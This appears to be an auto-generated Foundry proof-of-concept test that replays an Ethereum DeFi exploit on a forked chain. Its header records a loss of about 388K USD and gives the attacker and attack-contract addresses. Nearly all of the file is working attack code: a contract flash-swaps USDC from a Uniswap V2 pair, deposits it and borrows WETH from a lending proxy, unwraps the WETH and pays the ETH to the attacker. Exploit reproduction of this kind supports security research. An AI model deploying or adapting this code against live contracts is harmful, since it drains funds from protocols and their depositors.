// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 388.4K USD
// Attacker : 0x3885869b0f4526806b468a0c64a89bb860a18cee
// Attack Contract : 0x3e47945cca05439f99029a3d21e3166ce1a84fab
// Vulnerable Contract : 0x3e47945cca05439f99029a3d21e3166ce1a84fab
// Attack Tx : 0xa17dc37e1b65c65d20042212fb834974f7faaa961442e3fc05393778705f8474
// Block : 24538897
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 376.75K USD
//
// @POC Author
// Generated PoC

interface ISwapTarget {
    function swap(uint256 arg0, uint256 arg1, address arg2, bytes calldata arg3) external;
}

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 24538896;
    uint256 constant TX_TIMESTAMP = 1772082479;
    uint256 constant TX_BLOCK_NUMBER = 24538897;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory entryData = abi.encodeWithSelector(bytes4(0x095ea7b3), Addresses.ZERO, 5612909926920174741);
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 181745096492453810260);
        _expectProfit(
            Addresses.attack_contract,
            attack,
            Addresses.variableDebtEthereumWETH,
            "variableDebtEthereumWETH",
            187366746326704993556
        );
        _expectProfit(Addresses.attack_contract, attack, Addresses.LEthereumUSDC, "LEthereumUSDC", 8879192);
        _expectProfit(Addresses.A_4838B1_5F97, address(0), Addresses.ZERO, "ETH", 5612909926920174741);
    }
}

contract OurAttack {
    function _swapBorrowPayout() internal {
        IUNI_V2(Addresses.UNI_V2).token1();
        ISwapTarget(Addresses.UNI_V2)
            .swap(
                8879192,
                0,
                Addresses.attack_contract,
                hex"1e0107a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4809a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000044095ea7b30000000000000000000000007398e7e3603119d9241e45f688734436fd7b154000000000000000000000000000000000000000000000000000000000000000000aa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000024095ea7b30000000000000000000000007398e7e3603119d9241e45f688734436fd7b154000000a7398e7e3603119d9241e45f688734436fd7b1540000024e8eda9df000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800400000000000000000000000003e47945cca05439f99029a3d21e3166ce1a84fab0000000000000000000000000000000000000000000000000000000000000000097398e7e3603119d9241e45f688734436fd7b15400000a4a415bcad000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000a283c671293fa3514000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e47945cca05439f99029a3d21e3166ce1a84fab"
            );
        uint256 attackWethBalance = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(attackWethBalance);

        (bool payoutOk,) = payable(Addresses.A_4838B1_5F97).call{value: 5612909926920174741}("");
        require(payoutOk, "storage-contract payout failed");

        (bool attackerPayoutOk,) = payable(Addresses.attacker_eoa).call{value: 181749547183310220532}("");
        require(attackerPayoutOk, "attacker payout failed");
    }

    function _flashCallback() internal {
        _callbackDone[UNISWAP_CALLBACK] = true;
        IUNI_V2(Addresses.UNI_V2).getReserves();
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        IERC20Like(Addresses.USDC).approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_7398E7, 0);
        uint256 usdcAmount = 8879192;
        IERC20Like(Addresses.USDC).approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_7398E7, usdcAmount);
        IInitializableImmutableAdminUpgradeabilityProxy_7398E7(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_7398E7
            ).deposit(Addresses.USDC, usdcAmount, address(this), uint16(0));
        IInitializableImmutableAdminUpgradeabilityProxy_7398E7(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_7398E7
            ).borrow(Addresses.WETH, 187366746326704993556, 2, uint16(0), address(this));
        IUNI_V2(Addresses.UNI_V2).token1();
        IERC20Like(Addresses.WETH).transfer(Addresses.UNI_V2, 4289216474598283);
    }

    receive() external payable {}

    function approve(address spender, uint256 allowance) external payable {
        spender;
        allowance;
        _swapBorrowPayout();
        bytes memory ret = hex"00000000000000000000000000000000000000000000000a282d2a0d8ba4e989";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function uniswapV2Call(address sender, uint256 amount, uint256 amount1, bytes calldata callbackData)
        external
        payable
    {
        sender;
        amount;
        amount1;
        callbackData;
        if (!_callbackDone[UNISWAP_CALLBACK]) _flashCallback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    bytes32 private constant UNISWAP_CALLBACK = keccak256("poc.callback.UNISWAP");
    mapping(bytes32 => bool) private _callbackDone;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x3885869b0f4526806B468a0c64A89BB860a18cEe; // Addresses.attacker_eoa = 0x3885869b0f4526806b468a0c64a89bb860a18cee label=attacker_eoa roles=attacker_eoa|code_contract|contract|economic_holder|attack_address|profit_holder|recipient|sender|storage_contract source=tx_metadata.from confidence=high
    address internal constant attack_contract = 0x3e47945Cca05439f99029A3D21e3166Ce1A84FAb; // Addresses.attack_contract = 0x3e47945cca05439f99029a3d21e3166ce1a84fab label=attack_contract roles=attacker_callback_contract|attacker_contract|attacker_entry_contract|code_contract|contract|economic_holder|localized_contract|attack_address|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd; // Addresses.FiatTokenV2_2 = 0x43506849d7c04f9138d1a2050bbf3a0c054402dd label=FiatTokenV2_2 roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant A_4838B1_5F97 = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97; // Addresses.A_4838B1_5F97 = 0x4838b106fce9647bdf1e7877bf73ce8b0bad5f97 label=0x4838b106fce9647bdf1e7877bf73ce8b0bad5f97 roles=code_contract|contract|economic_holder|attack_address|profit_holder|recipient|storage_contract source=asset_delta.profit_candidates confidence=medium
    address internal constant DefaultReserveInterestRateStrategy = 0x5aD201bdA19bE82b875958940EeC5454462aA73D; // Addresses.DefaultReserveInterestRateStrategy = 0x5ad201bda19be82b875958940eec5454462aa73d label=DefaultReserveInterestRateStrategy roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_7398E7 =
        0x7398e7e3603119D9241E45f688734436Fd7B1540; // Addresses.InitializableImmutableAdminUpgradeabilityProxy_7398E7 = 0x7398e7e3603119d9241e45f688734436fd7b1540 label=InitializableImmutableAdminUpgradeabilityProxy roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant DefaultReserveInterestRateStrategy_859E = 0x78B5b6412DBBC611Ae28eE27d3FA2b2a3194859e; // Addresses.DefaultReserveInterestRateStrategy_859E = 0x78b5b6412dbbc611ae28ee27d3fa2b2a3194859e label=DefaultReserveInterestRateStrategy roles=storage_contract source=etherscan_v2 confidence=high
    address internal constant variableDebtEthereumWETH = 0x9517EB3669A4f51C30BFb86fCfDB6a3EA3571b92; // Addresses.variableDebtEthereumWETH = 0x9517eb3669a4f51c30bfb86fcfdb6a3ea3571b92 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=variableDebtEthereumWETH roles=asset|contract|economic_asset|profit_asset|token_related source=etherscan_v2 confidence=high
    address internal constant LEthereumUSDC = 0x95bd113164B304dabf1fc940Da2298DD45CA92FD; // Addresses.LEthereumUSDC = 0x95bd113164b304dabf1fc940da2298dd45ca92fd label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=LEthereumUSDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Addresses.USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|attack_address|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant UNI_V2 = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc; // Addresses.UNI_V2 = 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc label=UniswapV2Pair token_symbol=UNI-V2 roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Addresses.WETH = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 label=WETH9 token_symbol=WETH roles=asset|contract|attack_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant A_D060EB_45D2 = 0xD060EbD4f56bE8866376a3616B6e5aEF87F945D2; // Addresses.A_D060EB_45D2 = 0xd060ebd4f56be8866376a3616b6e5aef87f945d2 label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=attack_address source=unresolved confidence=low
}

interface IInitializableImmutableAdminUpgradeabilityProxy_7398E7 {
    function borrow(address, uint256, uint256, uint16, address) external;
    function deposit(address, uint256, address, uint16) external;
}

interface IUNI_V2 {
    function getReserves() external view;
    function token1() external view returns (uint256);
}

interface IWETH {
    function withdraw(uint256) external;
}
